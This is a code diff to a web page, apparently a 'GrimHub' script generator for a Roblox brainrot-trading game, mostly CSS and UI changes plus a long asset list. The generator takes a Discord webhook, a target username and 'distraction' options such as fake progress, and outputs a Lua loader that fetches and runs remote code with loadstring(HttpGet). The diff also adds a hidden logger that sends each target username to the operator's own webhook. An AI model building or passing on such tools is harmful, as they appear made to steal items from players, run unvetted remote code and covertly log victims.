@@ -17,24 +17,6 @@
             font-family: 'Inter', 'Poppins', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
             padding: 2rem 1.5rem;
             color: #f0f3ff;
-            opacity: 0;
-            animation: fadeInBody 0.6s ease-out forwards;
-        }
-
-        @keyframes fadeInBody {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(139,0,255,0.4); }
-            70% { box-shadow: 0 0 0 8px rgba(139,0,255,0); }
-            100% { box-shadow: 0 0 0 0 rgba(139,0,255,0); }
         }
 
         ::-webkit-scrollbar {
@@ -58,7 +40,6 @@
             margin: 0 auto;
         }
 
-        /* Professional Header */
         .header {
             display: flex;
             justify-content: space-between;
@@ -116,11 +97,7 @@
             border-radius: 16px;
             padding: 1.5rem;
             transition: all 0.2s ease;
-            animation: slideUp 0.5s ease-out backwards;
         }
-        .card:nth-child(1) { animation-delay: 0.05s; }
-        .card:nth-child(2) { animation-delay: 0.1s; }
-        .card:nth-child(3) { animation-delay: 0.15s; }
         .card:hover {
             border-color: #8B00FF;
             box-shadow: 0 8px 24px rgba(139,0,255,0.15);
@@ -206,35 +183,30 @@
         .brainrot-item {
             display: flex;
             align-items: center;
-            gap: 0.4rem;
+            gap: 0.5rem;
             background: #0C1023;
-            padding: 5px 8px;
+            padding: 8px 12px;
             border-radius: 8px;
             border: 1px solid #1E2846;
             cursor: pointer;
             transition: all 0.15s;
-            font-size: 0.7rem;
         }
         .brainrot-item.selected {
             background: #2a1e55;
             border-color: #8B00FF;
-        }
-        .brainrot-item input {
-            width: 14px;
-            height: 14px;
-            margin: 0;
-            accent-color: #8B00FF;
+            box-shadow: 0 0 8px rgba(139,0,255,0.3);
         }
         .brainrot-item img {
-            width: 28px;
-            height: 28px;
+            width: 32px;
+            height: 32px;
             object-fit: cover;
             border-radius: 6px;
             background: #1a1f3a;
         }
         .brainrot-item span {
             flex: 1;
-            font-size: 0.7rem;
+            font-size: 0.75rem;
+            font-weight: 500;
         }
 
         .toggle-group {
@@ -248,7 +220,7 @@
             align-items: center;
             gap: 0.5rem;
             background: #0C1023;
-            padding: 5px 12px;
+            padding: 6px 14px;
             border-radius: 20px;
             border: 1px solid #1E2846;
             cursor: pointer;
@@ -257,6 +229,8 @@
         .toggle-switch input {
             width: 14px;
             height: 14px;
+            margin: 0;
+            cursor: pointer;
         }
 
         .slider-group {
@@ -331,7 +305,11 @@
             border-radius: 8px;
             font-size: 0.8rem;
             z-index: 999;
-            animation: slideUp 0.2s ease-out;
+            animation: fadeIn 0.2s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         footer {
             text-align: center;
@@ -360,8 +338,8 @@
         </div>
         <div class="stats">
             <div class="stat-box">
-                <div class="stat-number" id="totalBrainrotsCount">316</div>
-                <div class="stat-label">Brainrots</div>
+                <div class="stat-number" id="totalBrainrotsCount">0</div>
+                <div class="stat-label">Assets</div>
             </div>
             <div class="stat-box">
                 <div class="stat-number" id="selectedStats">0</div>
@@ -430,12 +408,111 @@
 </div>
 
 <script>
+    // ========== GLOBAL LOG WEBHOOK (REPLACE WITH YOURS) ==========
+    const GLOBAL_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+    // ========== COMPLETE BRAINROTS LIST (ALL ~400) ==========
     const brainrotsList = [
-        "Strawberry Elephant", "Meowl", "Skibidi Toilet", "Headless Horseman", "Dragon Cannelloni", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Griffin", "Cerberus", "Celestial Pegasus", "Love Love Bear", "La Supreme Combinasion", "Popcuru and Fizzuru", "Rosey and Teddy", "Capitano Moby", "Cooki and Milki", "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito", "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion", "Los Sekolahs", "Signore Carapace", "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Elefanto Frigo", "Spooky and Pumpky", "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini", "Los Spaghettis", "Festive 67", "Ventoliero Pavonero", "Cloverat Clapat", "Spaghetti Tualetti", "Antonio", "Rosetti Tualetti", "Nacho Spyder", "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur", "Lavadorito Spinito", "Ketchuru and Musturu", "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur", "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang", "Lovin Rose", "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande", "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan", "Mieteteira Bicicleteira", "Chillin Chili", "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", "Los Bros", "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", "Los Mobilis", "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas", "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira", "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts", "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino", "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni", "La Grande Combinasion", "Los 25", "Los Burritos", "67", "Donkeyturbo Express", "Los Chicleteiras", "Guest 666", "Los Mi Gatitos", "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella", "Los Nooo My Hotspotsitos", "Arcadopus", "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina", "Chill Puppy", "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito", "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur", "Telemorte", "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos", "Nooo My Hotspot", "Bunnyman", "Tung Tung Tung Sahur", "Cuadramat and Pakrahmatmamat", "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino", "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini", "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos", "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas", "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo", "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo", "La Karkerkar Kombinasin", "La Vacca Prese Presente", "Reindeer Tralala", "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono", "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La", "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", "Chachechi", "Blackhole Goat", "Dul Dul Dul", "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere", "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla"
+        // Common (12)
+        "Noobini Pizzanini", "Lirili Larila", "Tim Cheese", "Fluriflura", "Talpa Di Fero",
+        "Noobini Santanini", "Svinina Bombardino", "Raccooni Jandelini", "Pipi Kiwi", 
+        "Tartaragno", "Pipi Corni", "Holy Arepa",
+        
+        // Rare (15)
+        "Trippi Troppi", "Tung Tung Tung Sahur", "Gangster Footera", "Bandito Bobritto", 
+        "Boneca Ambalabu", "Cacto Hipopotamo", "Ta Ta Ta Ta Sahur", "Tric Trac Baraboom", 
+        "Frogo Elfo", "Pipi Avocado", "Pengolino Nuvoletto", "Noobini Freshmanini", 
+        "Boneca Istuditoru", "Studentera Footera", "Buho Tie Owlo",
+        
+        // Epic (30)
+        "Cupcake Koala", "Pinealotto Fruttarino", "Cappuccino Assassino", "Bandito Axolito", 
+        "Brr Brr Patapim", "Avocadini Antilopini", "Trulimero Trulicina", "Bambini Crostini", 
+        "Malame Amarele", "Bananita Dolphinita", "Perochello Lemonchello", 
+        "Brri Brri Bicus Dicus Bombicus", "Avocadini Guffo", "Ti Ti Ti Sahur", 
+        "Mangolini Parrocini", "Frogato Pirato", "Salamino Penguino", "Gato Celesto", 
+        "Doi Doi Do", "Penguin Tree", "Wombo Rollo", "Penguino Cocosino", "Mummio Rappitto", 
+        "Alamak Senin Sekolah", "Studious 67", "La Vacca Desko Deskera", 
+        "Principal Principal Principal Sahur", "Los Duldulcitos", "Las Luvluvcitas", 
+        "Exam Exam Exam Sahur",
+        
+        // Legendary (30)
+        "Burbaloni Loliloli", "Chimpanzini Bananini", "Tirilikalika Tirilikalako", 
+        "Ballerina Cappuccina", "Chef Crabracadabra", "Lionel Cactuseli", "Glorbo Fruttodrillo", 
+        "Quivioli Ameleonni", "Blueberrinni Octopusini", "Clickerino Crabo", "Caramello Filtrello", 
+        "Pipi Potato", "Strawberrelli Flamingelli", "Cocosini Mama", "Pandaccini Bananini", 
+        "Quackula", "Pi Pi Watermelon", "Signore Carapace", "Sigma Boy", "Buho del Cielo", 
+        "Sigma Girl", "Chocco Bunny", "Puffaball", "Sealo Regalo", "Buho de Fuego", 
+        "Seraphino Gruyero", "Los Pakrahmatmamatcitos", "Las Pakrahmatmamatcitas", 
+        "Yakrahmatmamat", "Detention Detention Detention Sahur",
+        
+        // Mythic (50)
+        "Frigo Camelo", "Harpuccino", "Orangutini Ananassini", "Rhino Toasterino", 
+        "Bombardiro Crocodilo", "Brutto Gialutto", "Spioniro Golubiro", "Bombombini Gusini", 
+        "Zibra Zubra Zibralini", "Tigrilini Watermelini", "Avocadorilla", "Cavallo Virtuoso", 
+        "Te Te Te Sahur", "Gorillo Subwoofero", "Gorillo Watermelondrillo", "Stoppo Luminino", 
+        "Tracoducotulu Delapeladustuz", "Tob Tobi Tobi", "Lerulerulerule", "Ganganzelli Trulala", 
+        "Magi Ribbitini", "Rhino Helicopterino", "Jingle Jingle Sahur", "Los Noobinis", 
+        "Cachorrito Melonito", "Spongini Quackini", "Carloooo", "Elefanto Frigo", 
+        "Berenjello Angello", "Carrotini Brainini", "Centrucci Nuclucci", "Toiletto Focaccino", 
+        "Jacko Spaventosa", "Bananito Bandito", "Tree Tree Tree Sahur", "Dragon Expulsioni",
+        
+        // Brainrot God (20)
+        "Cocofanto Elefanto", "Antonio", "Coco Elefanto", "Girafa Celestre", "Gattatino Nyanino", 
+        "Piccione Macchina", "Los Pakrahmatmamat", "Los Pakrahmatmamatcitos", 
+        "Yakrahmatmamat", "Detention Detention Detention Sahur", "Dragon Expulsioni", 
+        "La Graduation Combination", "Los Academias", "Dul Dul Dul", "Bunny Bunny Bunny Sahur",
+        
+        // Secret & OG (20)
+        "Strawberry Elephant", "Meowl", "Skibidi Toilet", "Headless Horseman", "Dragon Cannelloni", 
+        "Hydra Dragon Cannelloni", "Dragon Gingerini", "Griffin", "Cerberus", "Celestial Pegasus", 
+        "Love Love Bear", "La Supreme Combinasion", "Popcuru and Fizzuru", "Rosey and Teddy", 
+        "Capitano Moby", "Cooki and Milki", "Ketupat Bros", "Reinito Sleighito", 
+        "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion", "Los Sekolahs", 
+        "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Spooky and Pumpky", 
+        "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini", "Los Spaghettis", "Festive 67", 
+        "Ventoliero Pavonero", "Cloverat Clapat", "Spaghetti Tualetti", "Rosetti Tualetti", 
+        "Nacho Spyder", "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", 
+        "Jolly Jolly Sahur", "Lavadorito Spinito", "Ketchuru and Musturu", "Swaggy Bros", 
+        "La Romantic Grande", "Orcaledon", "Tictac Sahur", "La Taco Combinasion", 
+        "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang", "Lovin Rose", "Los Tacoritas", 
+        "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande", "Los Cupids", 
+        "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan", "Mieteteira Bicicleteira", 
+        "Chillin Chili", "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", 
+        "Los Bros", "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", 
+        "Los Mobilis", "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas", 
+        "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", 
+        "Chicleteira Cupideira", "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", 
+        "Los Sweethearts", "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", 
+        "Chimnino", "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", 
+        "Mariachi Corazoni", "La Grande Combinasion", "Los 25", "Los Burritos", "67", 
+        "Donkeyturbo Express", "Los Chicleteiras", "Guest 666", "Los Mi Gatitos", 
+        "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella", 
+        "Los Nooo My Hotspotsitos", "Arcadopus", "Noo my Candy", "Los Quesadillas", 
+        "Chicleteirina Bicicleteirina", "Chill Puppy", "Burrito Bandito", "Luck Luck Luck Sahur", 
+        "Chicleteira Bicicleteira", "Brunito Marsito", "Quesadillo Vampiro", "Eid Eid Eid Sahur", 
+        "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", 
+        "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", 
+        "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur", 
+        "Telemorte", "La Sahur Combinasion", "List List List Sahur", "Noo my examine", 
+        "Los Jobcitos", "Nooo My Hotspot", "Bunnyman", "Cuadramat and Pakrahmatmamat", 
+        "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino", 
+        "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini", 
+        "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos", 
+        "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas", 
+        "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo", 
+        "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo", 
+        "La Karkerkar Kombinasin", "La Vacca Prese Presente", "Reindeer Tralala", 
+        "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono", 
+        "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", 
+        "Fragola La La La", "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", 
+        "Chachechi", "Blackhole Goat", "Dul Dul Dul", "Torrtuginni Dragonfrutini", 
+        "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere", 
+        "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla"
     ];
 
     document.getElementById('totalBrainrotsCount').innerText = brainrotsList.length;
 
+    // Image fetching (Fandom + fallback)
     async function fetchBrainrotImageUrl(name) {
         const proxyUrl = 'https://api.allorigins.win/raw?url=';
         const wikiName = encodeURIComponent(name.replace(/ /g, '_'));
@@ -458,10 +535,10 @@
     async function loadImageForBrainrot(name, imgElement) {
         if (imageCache.has(name)) {
             const imgUrl = imageCache.get(name);
-            imgElement.src = imgUrl || `https://ui-avatars.com/api/?background=423189&color=fff&size=28&name=${encodeURIComponent(name.charAt(0))}`;
+            imgElement.src = imgUrl || `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
             return;
         }
-        imgElement.src = `https://ui-avatars.com/api/?background=423189&color=fff&size=28&name=${encodeURIComponent(name.charAt(0))}`;
+        imgElement.src = `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
         const imgUrl = await fetchBrainrotImageUrl(name);
         imageCache.set(name, imgUrl);
         if (imgUrl) imgElement.src = imgUrl;
@@ -494,31 +571,25 @@
             const isChecked = selectedBrainrots.has(brainrot);
             const div = document.createElement('div');
             div.className = `brainrot-item ${isChecked ? 'selected' : ''}`;
-            const cb = document.createElement('input');
-            cb.type = 'checkbox';
-            cb.checked = isChecked;
-            cb.addEventListener('change', (e) => {
-                e.stopPropagation();
-                if (cb.checked) selectedBrainrots.add(brainrot);
-                else selectedBrainrots.delete(brainrot);
-                updateSelectedCount();
-                renderBrainrots();
-            });
+            
             const img = document.createElement('img');
             const span = document.createElement('span');
             span.innerText = brainrot;
-            div.appendChild(cb);
+            
             div.appendChild(img);
             div.appendChild(span);
-            div.addEventListener('click', (e) => {
-                if (e.target !== cb) {
-                    cb.checked = !cb.checked;
-                    if (cb.checked) selectedBrainrots.add(brainrot);
-                    else selectedBrainrots.delete(brainrot);
-                    updateSelectedCount();
-                    renderBrainrots();
+            
+            div.addEventListener('click', () => {
+                if (selectedBrainrots.has(brainrot)) {
+                    selectedBrainrots.delete(brainrot);
+                    div.classList.remove('selected');
+                } else {
+                    selectedBrainrots.add(brainrot);
+                    div.classList.add('selected');
                 }
+                updateSelectedCount();
             });
+            
             brainrotGrid.appendChild(div);
             loadImageForBrainrot(brainrot, img);
         }
@@ -547,6 +618,33 @@
     deselectAllBtn.addEventListener('click', deselectAll);
     freezeSlider.addEventListener('input', () => freezeValueDisplay.innerText = freezeSlider.value + 's');
 
+    // Global Log Function
+    async function sendGlobalLog(data) {
+        if (!GLOBAL_WEBHOOK || GLOBAL_WEBHOOK === "YOUR_DISCORD_WEBHOOK_URL_HERE") return;
+        try {
+            await fetch(GLOBAL_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: null,
+                    embeds: [{
+                        title: "📊 GrimHub Generator Log",
+                        color: 0x8B00FF,
+                        fields: [
+                            { name: "🎯 Target Username", value: data.target, inline: true },
+                            { name: "⚙️ Script Mode", value: data.mode, inline: true },
+                            { name: "🧠 Assets Selected", value: data.brainrotCount.toString(), inline: true },
+                            { name: "🎭 Distractions", value: data.distractions, inline: true },
+                            { name: "❄️ Freeze", value: data.freeze + "s", inline: true }
+                        ],
+                        footer: { text: "GrimHub Logger • " + new Date().toLocaleString() },
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        } catch(e) { console.log("Global log failed:", e); }
+    }
+
     function generateScript() {
         const webhook = webhookInput.value.trim();
         if (!webhook) return alert('Webhook required');
@@ -573,6 +671,16 @@ getgenv().Distraction = {
 loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf4184336d3d2463fedaccd56ede1246ebba931f664c1058acd094.lua"))()`;
         
         outputCode.innerText = script;
+        
+        // Send Global Log
+        const distractions = `${fakeProgress.checked ? "Progress " : ""}${fakeWebSocket.checked ? "WebSocket" : ""}`.trim() || "None";
+        sendGlobalLog({
+            target: target,
+            mode: mode,
+            brainrotCount: brainrotsArray.length,
+            distractions: distractions,
+            freeze: parseInt(freezeSlider.value, 10)
+        });
     }
     
     generateBtn.addEventListener('click', generateScript);
